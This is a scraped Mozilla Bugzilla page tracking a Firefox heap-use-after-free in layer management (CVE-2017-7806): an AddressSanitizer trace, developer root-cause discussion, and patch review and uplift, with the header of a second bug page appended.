#0 0x4bb9ec in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan\_malloc\_linux.cc:64:3
#1 0x4ecf0d in moz\_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17
#2 0x7f6be5128fa2 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12
#3 0x7f6be5128fa2 in mozilla::widget::PuppetWidget::GetLayerManager(mozilla::layers::PLayerTransactionChild\*, mozilla::layers::LayersBackend, nsIWidget::LayerManagerPersistence) /home/worker/workspace/build/src/widget/PuppetWidget.cpp:582
#4 0x7f6be4a02bc1 in mozilla::dom::TabChild::InitRenderingState(mozilla::layers::TextureFactoryIdentifier const&, unsigned long const&, mozilla::layers::CompositorOptions const&, mozilla::layout::PRenderFrameChild\*) /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:2633:24
#5 0x7f6be4a0272d in mozilla::dom::TabChild::DoFakeShow(mozilla::layers::TextureFactoryIdentifier const&, unsigned long const&, mozilla::layers::CompositorOptions const&, mozilla::layout::PRenderFrameChild\*, mozilla::dom::ShowInfo const&) /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:1130:3
#6 0x7f6be49807d7 in mozilla::dom::ContentChild::ProvideWindowCommon(mozilla::dom::TabChild\*, mozIDOMWindowProxy\*, bool, unsigned int, bool, bool, bool, nsIURI\*, nsAString const&, nsACString const&, bool, bool\*, mozIDOMWindowProxy\*\*) /home/worker/workspace/build/src/dom/ipc/ContentChild.cpp:1026:13
#7 0x7f6be49ff4f0 in mozilla::dom::TabChild::ProvideWindow(mozIDOMWindowProxy\*, unsigned int, bool, bool, bool, nsIURI\*, nsAString const&, nsACString const&, bool, bool\*, mozIDOMWindowProxy\*\*) /home/worker/workspace/build/src/dom/ipc/TabChild.cpp:1004:16
#8 0x7f6be92eb550 in nsWindowWatcher::OpenWindowInternal(mozIDOMWindowProxy\*, char const\*, char const\*, char const\*, bool, bool, bool, nsIArray\*, bool, bool, nsIDocShellLoadInfo\*, mozIDOMWindowProxy\*\*) /home/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:879:24
#9 0x7f6be92f060f in OpenWindow2 /home/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:444:10
#10 0x7f6be92f060f in non-virtual thunk to nsWindowWatcher::OpenWindow2(mozIDOMWindowProxy\*, char const\*, char const\*, char const\*, bool, bool, bool, nsISupports\*, bool, bool, nsIDocShellLoadInfo\*, mozIDOMWindowProxy\*\*) /home/worker/workspace/build/src/toolkit/components/windowwatcher/nsWindowWatcher.cpp:416
#11 0x7f6be164a85a in nsGlobalWindow::OpenInternal(nsAString const&, nsAString const&, nsAString const&, bool, bool, bool, bool, bool, nsIArray\*, nsISupports\*, nsIDocShellLoadInfo\*, bool, nsPIDOMWindowOuter\*\*) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:13036:21
#12 0x7f6be1648f6f in OpenJS /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8924:10
#13 0x7f6be1648f6f in nsGlobalWindow::OpenOuter(nsAString const&, nsAString const&, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8886
#14 0x7f6be16493fd in nsGlobalWindow::Open(nsAString const&, nsAString const&, nsAString const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:8895:3
#15 0x7f6be2b1fc22 in mozilla::dom::WindowBinding::open(JSContext\*, JS::Handle<JSObject\*>, nsGlobalWindow\*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:2414:56
#16 0x7f6be2b1e500 in mozilla::dom::WindowBinding::genericMethod(JSContext\*, unsigned int, JS::Value\*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15689:13
#17 0x7f6be9845724 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:293:15
#18 0x7f6be9845724 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:470
#19 0x7f6be982e54b in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:521:12
#20 0x7f6be982e54b in Interpret(JSContext\*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3060
#21 0x7f6be98152c8 in js::RunScript(JSContext\*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:410:12
#22 0x7f6be98458bc in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:488:15
#23 0x7f6be9846212 in js::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534:10
#24 0x7f6bea1bce1b in JS::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2948:12
#25 0x7f6be2dae555 in mozilla::dom::EventHandlerNonNull::Call(JSContext\*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:260:37
#26 0x7f6be37386fb in Call<nsISupports \*> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:362:12
#27 0x7f6be37386fb in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent\*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:215
#28 0x7f6be37017b9 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener\*, nsIDOMEvent\*, mozilla::dom::EventTarget\*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1142:51
#29 0x7f6be3703692 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext\*, mozilla::WidgetEvent\*, nsIDOMEvent\*\*, mozilla::dom::EventTarget\*, nsEventStatus\*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1314:20
#30 0x7f6be36e37c1 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback\*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:464:16
#31 0x7f6be36e6c92 in mozilla::EventDispatcher::Dispatch(nsISupports\*, nsPresContext\*, mozilla::WidgetEvent\*, nsIDOMEvent\*, nsEventStatus\*, mozilla::EventDispatchingCallback\*, nsTArray<mozilla::dom::EventTarget\*>\*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:824:9
#32 0x7f6be593e94f in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1104:7
#33 0x7f6be888df3a in nsDocShell::EndPageLoad(nsIWebProgress\*, nsIChannel\*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7698:21
#34 0x7f6be8889f98 in nsDocShell::OnStateChange(nsIWebProgress\*, nsIRequest\*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7496:7
#35 0x7f6be889150f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress\*, nsIRequest\*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7393:13
SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 in Length
Shadow bytes around the buggy address:
0x0c288002f5e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0c288002f5f0: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
0x0c288002f600: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
0x0c288002f610: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
0x0c288002f620: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
=>0x0c288002f630: fd fd fd fd fd fd fd fd fd fd fd[fd]fd fa fa fa
0x0c288002f640: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
0x0c288002f650: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0c288002f660: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0c288002f670: 00 00 00 00 00 00 00 00 07 fa fa fa fa fa fa fa
0x0c288002f680: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable: 00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone: fa
Heap right redzone: fb
Freed heap region: fd
Stack left redzone: f1
Stack mid redzone: f2
Stack right redzone: f3
Stack partial redzone: f4
Stack after return: f5
Stack use after scope: f8
Global redzone: f9
Global init order: f6
Poisoned by user: f7
Container overflow: fc
Array cookie: ac
Intra object redzone: bb
ASan internal: fe
Left alloca redzone: ca
Right alloca redzone: cb
==27239==ABORTING

|  | [Nils](/user_profile?user_id=344130)  Reporter |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1378113#c1)• 8 years ago |
|  | |

Attached file
[crash.html (testcase, crashes firefox)](attachment.cgi?id=8883282)
— [Details](attachment.cgi?id=8883282&action=edit)

|  | [Nils](/user_profile?user_id=344130)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1378113#c2)• 8 years ago |
|  | |

Attached file
[ASAN output](attachment.cgi?id=8883283)
— [Details](attachment.cgi?id=8883283&action=edit)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a124362_1689)• 8 years ago |

Group: core-security → gfx-core-securityFlags: sec-bounty?Keywords: [crash](/buglist.cgi?keywords=crash&resolution=---),
[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---),
[testcase](/buglist.cgi?keywords=testcase&resolution=---)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1378113#c3)• 8 years ago |
|  | |

I haven't been able to reproduce this on release builds older than Fx54 (including ESR52). Note that the testcase can require multiple refreshes before finally crashing (at least for me). I tweaked the testcase to loop indefinitely to make it easier to reproduce, but it still had to run for awhile sometimes before finally crashing. I was able to get a regression range down to around February 12 give or take but it was surprisingly difficult to get it down much further than that.
David, can you take a look or suggest someone else who might?
[status-firefox54](/buglist.cgi?f1=cf_status_firefox54&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=wontfix)
[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected)
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=affected)
[status-firefox-esr52](/buglist.cgi?f1=cf_status_firefox_esr52&o1=isnotempty):
--- → [unaffected](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=unaffected)
[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F)
[tracking-firefox56](/buglist.cgi?f1=cf_tracking_firefox56&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=%3F)Flags: needinfo?(dvander)Version: 56 Branch → 54 Branch

|  | [Milan Sreckovic [:milan] (needinfo for best results)](/user_profile?user_id=456486) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a637126_456486)• 8 years ago |

Whiteboard: [gfx-noted]

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1378113#c4)• 8 years ago |
|  | |

So the key part is that the send() call spins the event loop, processes the delayed close logic. What's not clear to me is why the DidComposite bits either still happen after that or don't deal with happening after close...

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1378113#c5)• 8 years ago |
|  | |

I guess it's possible we did that destruction callstack under DidComposite or something? Having a full untruncated destruction stack would answer that.

|  | [David Anderson [:dvander] - inactive, e-mail if emergency](/user_profile?user_id=309316) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1378113#c6)• 8 years ago |
|  | |

(In reply to Boris Zbarsky [:bz] from [comment #5](/show_bug.cgi?id=1378113#c5 "RESOLVED FIXED - heap-use-after-free in mozilla::layers::ClientLayerManager::DidComposite"))
> I guess it's possible we did that destruction callstack under DidComposite
> or something? Having a full untruncated destruction stack would answer that.
Yup, that is exactly what happens. This [1] should be holding a RefPtr since GetLayerManager does not return one. Alternately, we could hold a ref in ClientLayerManager::DidComposite. it's the transaction notification that is re-entrant [2].
[1] <http://searchfox.org/mozilla-central/source/dom/ipc/TabChild.cpp#2948>
[2] <http://searchfox.org/mozilla-central/source/gfx/layers/client/ClientLayerManager.cpp#519>Flags: needinfo?(dvander)

|  | [Milan Sreckovic [:milan] (needinfo for best results)](/user_profile?user_id=456486) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a801964_456486)• 8 years ago |

Assignee: nobody → nical.bugzilla

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1378113#c7)• 8 years ago |
|  | |

tracking as sec-high
[tracking-firefox55](/buglist.cgi?f1=cf_tracking_firefox55&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B)
[tracking-firefox56](/buglist.cgi?f1=cf_tracking_firefox56&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox56&o1=equals&v1=%2B)

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1378113#c8)• 8 years ago |
|  | |

Attached patch

[Make sure the layer manager stays alive until the end of the method call.](attachment.cgi?id=8887062&action=diff)
— [Details](attachment.cgi?id=8887062&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1378113&attachment=8887062)

Also affects WebRenderLayerManager.
[Attachment #8887062](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") -
Flags: review?(dvander)

|  | [David Anderson [:dvander] - inactive, e-mail if emergency](/user_profile?user_id=309316) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a1141545_309316)• 8 years ago |

[Attachment #8887062](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") -
Flags: review?(dvander) → review+

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1378113#c9)• 8 years ago |
|  | |

Comment on [attachment 8887062](/attachment.cgi?id=8887062 "Make sure the layer manager stays alive until the end of the method call.") [[details]](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") [[diff]](/attachment.cgi?id=8887062&action=diff "Make sure the layer manager stays alive until the end of the method call.") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1378113&attachment=8887062)
Make sure the layer manager stays alive until the end of the method call.
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
I am not very qualified to judge but I expect it wuld be hard to exploit. It's a use-after-free deep down the rendering engine that can't be reproduced easily because it is timing related and it would be hard for js code to influence exactly what the objects in question look like and where they are in memory.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
No.
Which older supported branches are affected by this flaw?
Not sure. I think that this was introduced by recent quantum-flow related changes that that added nested event loops in IPC code. I don't know when they landed but not more than a train or two ago.
If not all supported branches, which bug introduced the flaw?
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
We can easily backport this fix to any branch (even the ones without the nested event loops, just to be sure).
How likely is this patch to cause regressions; how much testing does it need?
Unlikely.
[Attachment #8887062](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") -
Flags: sec-approval?

|  | [Milan Sreckovic [:milan] (needinfo for best results)](/user_profile?user_id=456486) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a1219411_456486)• 8 years ago |

Priority: -- → P3

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1378113#c10)• 8 years ago |
|  | |

Comment on [attachment 8887062](/attachment.cgi?id=8887062 "Make sure the layer manager stays alive until the end of the method call.") [[details]](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") [[diff]](/attachment.cgi?id=8887062&action=diff "Make sure the layer manager stays alive until the end of the method call.") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1378113&attachment=8887062)
Make sure the layer manager stays alive until the end of the method call.
sec-approval+ for trunk.
We'll want a beta branch patch made and nominated to land ASAP after this lands on trunk.
[Attachment #8887062](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") -
Flags: sec-approval? → sec-approval+

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a1408224_406194)• 8 years ago |

Blocks: [1382636](/show_bug.cgi?id=1382636 "RESOLVED DUPLICATE - Intermittent AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 in Length")

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1378113#c11)• 8 years ago |
|  | |

<https://hg.mozilla.org/integration/mozilla-inbound/rev/6b0a79f9009435f0ea475240c9a7aaf64c4cfc79>

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1378113#c12)• 8 years ago |
|  | |

Comment on [attachment 8887062](/attachment.cgi?id=8887062 "Make sure the layer manager stays alive until the end of the method call.") [[details]](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") [[diff]](/attachment.cgi?id=8887062&action=diff "Make sure the layer manager stays alive until the end of the method call.") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1378113&attachment=8887062)
Make sure the layer manager stays alive until the end of the method call.
Approval Request Comment
[Feature/Bug causing the regression]:
[User impact if declined]: UAF crash.
[Is this code covered by automated tests?]: No.
[Has the fix been verified in Nightly?]: It has landed, but hasn't baked in nightly enough to know for certain that the problem is gone. Some local testing suggests it is fixed.
[Needs manual test from QE? If yes, steps to reproduce]: No.
[List of other uplifts needed for the feature/fix]: None.
[Is the change risky?]: No.
[Why is the change risky/not risky?]: Very simple, just increment/decrement a reference count if the object lifetime change could cause an issue it would be only in a situation where we are crashing with with UAF.
[String changes made/needed]: None.
[Attachment #8887062](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") -
Flags: approval-mozilla-beta?

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1378113#c13)• 8 years ago |
|  | |

The patch applies cleanly to beta.

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1378113#c14)• 8 years ago |
|  | |

<https://hg.mozilla.org/mozilla-central/rev/6b0a79f90094>Status: NEW → RESOLVEDClosed: 8 years ago
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → mozilla56

|  | [Julien Cristau [:jcristau]](/user_profile?user_id=580382) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1378113#c15)• 8 years ago |
|  | |

Comment on [attachment 8887062](/attachment.cgi?id=8887062 "Make sure the layer manager stays alive until the end of the method call.") [[details]](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") [[diff]](/attachment.cgi?id=8887062&action=diff "Make sure the layer manager stays alive until the end of the method call.") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1378113&attachment=8887062)
Make sure the layer manager stays alive until the end of the method call.
uaf fix, sec-high, beta55+
should be in 55.0b12
[Attachment #8887062](/attachment.cgi?id=8887062&action=edit "Make sure the layer manager stays alive until the end of the method call.") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a1478813_406194)• 8 years ago |

No longer blocks: [1382636](/show_bug.cgi?id=1382636 "RESOLVED DUPLICATE - Intermittent AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:398:37 in Length")

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1378113#c17)• 8 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-beta/rev/62834c042149634c2414aeae0fad7c7415b9483d>

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a1481107_75935)• 8 years ago |

[status-firefox55](/buglist.cgi?f1=cf_status_firefox55&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=fixed)

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a2027455_280903)• 7 years ago |

Alias: CVE-2017-7806

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a2027625_280903)• 7 years ago |

Whiteboard: [gfx-noted] → [gfx-noted][adv-main55+]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a2350457_1689)• 7 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a2366318_1689)• 7 years ago |

Group: gfx-core-security → core-security-release

|  | [Matt Wobensmith [:mwobensmith][:matt:]](/user_profile?user_id=452604) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a2380700_452604)• 7 years ago |

Flags: qe-verify+Whiteboard: [gfx-noted][adv-main55+] → [gfx-noted][adv-main55+][post-critsmash-triage]

|  | [Andrei Vaida [:avaida]](/user_profile?user_id=488993) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1378113#c18)• 7 years ago |
|  | |

I was able to reproduce the crash on an affected asan build (56.0a1, 20170704100439) using the test case from [Comment 0](/show_bug.cgi?id=1378113#c0 "RESOLVED FIXED - heap-use-after-free in mozilla::layers::ClientLayerManager::DidComposite") on Ubuntu 16.04 x64.
The crash is no longer occurring on Ubuntu 16.04 x64 using asan 56.0a1 (20170801004347), but asan 52.2.1esr (20170731121041) and 55.0b14 (20170731114018) are crashing easily. Nicolas, any thoughts on this?Flags: needinfo?(nical.bugzilla)

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1378113#c19)• 7 years ago |
|  | |

55.0b14 (20170731114018) should have the fix, do you have a crash report handy so that I cam check that the issue is the same? I haven't made any uplift to esr branches, it would probably make sense to land the patch there as well.Flags: needinfo?(nical.bugzilla)

|  | [Andrei Vaida [:avaida]](/user_profile?user_id=488993) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1378113#c20)• 7 years ago |
|  | |

(In reply to Nicolas Silva [:nical] from [comment #19](/show_bug.cgi?id=1378113#c19 "RESOLVED FIXED - heap-use-after-free in mozilla::layers::ClientLayerManager::DidComposite"))
> 55.0b14 (20170731114018) should have the fix, do you have a crash report
> handy so that I cam check that the issue is the same? I haven't made any
> uplift to esr branches, it would probably make sense to land the patch there
> as well.
Per our conversation on irc, I'm unable to provide a crash report because both 55.0b14 and 52.2esr are completely killed off by the test case, with no crash reports displayed in about:crashes. Nicolas will try to reproduce this locally.
[status-firefox56](/buglist.cgi?f1=cf_status_firefox56&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=verified)

|  | [Nicolas Silva [:nical]](/user_profile?user_id=438998)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1378113#c21)• 7 years ago |
|  | |

I downloaded and updated a beta build and ran the test case continuously for a few minutes without crashing. I did the same with a a fresh beta build off of mercurial and the issue doesn't reproduce either.

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a18360665_1689)• 7 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1378113#a217915233_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1378113&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Nils](/user_profile?user_id=344130)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.mozilla.org_b090faeb_20250126_113748.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1365189)
* [XML](/show_bug.cgi?ctype=xml&id=1365189)

Closed
[Bug 1365189](/show_bug.cgi?id=1365189)
(CVE-2017-7786)

Opened 8 years ago
Closed 8 years ago

# type confusion in mozilla::SVGGeometryFrame::GetCanvasTM

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

type confusion in mozilla::SVGGeometryFrame::GetCanvasTM

## Categories

### (Core :: SVG, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=SVG#SVG)

SVG
▾

Core :: SVG

Issues with the layout or rendering of SVG content and interacting with the SVG DOM.

Example bugs:

* SVG marker can not be clipped with clip-path
* x position adjustments of SVG vertical text on a path moves in the wrong direction

Specifications covered:

* SVG

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=SVG&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=SVG&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=SVG)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)
